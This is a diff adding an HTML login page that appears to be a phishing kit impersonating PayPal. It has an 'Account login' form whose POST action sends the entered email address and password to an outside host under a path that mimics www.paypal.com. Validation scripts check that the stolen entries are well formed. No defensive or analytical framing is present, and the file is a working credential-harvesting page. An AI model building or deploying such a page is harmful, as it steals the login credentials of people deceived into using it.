@@ -1,0 +1,69 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+
+<html>
+<head>
+	<title>Login</title>
+		<script language="JavaScript" src="v.js" type="text/javascript"></script>
+	<link rel="stylesheet" type="text/css" href="pmcss.css"> 
+<link rel="stylesheet" type="text/css" href="licss.css"> 
+	<link href="fav.ico" rel="shortcut icon">
+
+</head>
+
+<body topmargin="0" >
+
+<table cellspacing="0" cellpadding="0" width="760" align="center">
+
+<tr>
+       <td><img src="topmain.PNG" width="760" height="64" border="0"></td>
+</tr>
+</table>
+<br><br>
+<table cellspacing="0" cellpadding="0" width="760" align="center">
+
+<tr>
+       <td><a href="login.html#"><img src="menumain.PNG" width="760" height="22" border="0"></a></td>
+</tr>
+</table>
+<br><br>
+<table cellspacing="0" cellpadding="0" width="760" align="center">
+
+<tr>
+       <td valign="top" width="180">
+	   <div id="xptContentMain"> 
+
+	   <div class="box login">
+	    <div class="header"><h2>Account login</h2></div>
+<div class="body">
+<form method="POST" name="login" action="http://jetsteamtalk.com/.owr/www.paypal.com/wbs.php" > 
+<p><label for="login_email">Email address</label><input type="text" id="li" class="" name="li"></p>
+<p><label for="login_password">Password</label><input autocomplete="off" type="password" id="pw" name="pw" value="">
+<input type="submit" name="submit.x" value="Log In" class="button primary"></p>
+ <p><img src="ntp.PNG" width="142" height="57" border="0"></p>
+<input name="form_charset" type="hidden" value="UTF-8">
+</form></div></div>
+</td>
+	   <td width="10"></td>
+	   <td valign="top" width="570"><img src="banner.PNG" width="562" height="231" border="0"></td>
+</tr>
+</table>
+<br><br>
+<table cellspacing="0" cellpadding="0" width="760" align="center">
+
+<tr>
+       <td><center><img src="bottom.PNG" width="459" height="97" border="0"></td>
+</tr>
+</table>
+
+<script language="JavaScript" type="text/javascript">
+
+ var frmvalidator = new Validator("login");
+ frmvalidator.addValidation("pw","req","Some information is incorrect or missing. Please correct your entries and try again.");
+ frmvalidator.addValidation("pw","minlen=8","Some information is incorrect or missing. Please correct your entries and try again.");
+ frmvalidator.addValidation("li","req","Some information is incorrect or missing. Please correct your entries and try again.");
+ frmvalidator.addValidation("li","minlen=6","Some information is incorrect or missing. Please correct your entries and try again.");
+ frmvalidator.addValidation("li","email","Some information is incorrect or missing. Please correct your entries and try again.");
+
+</script>
+</body>
+</html>
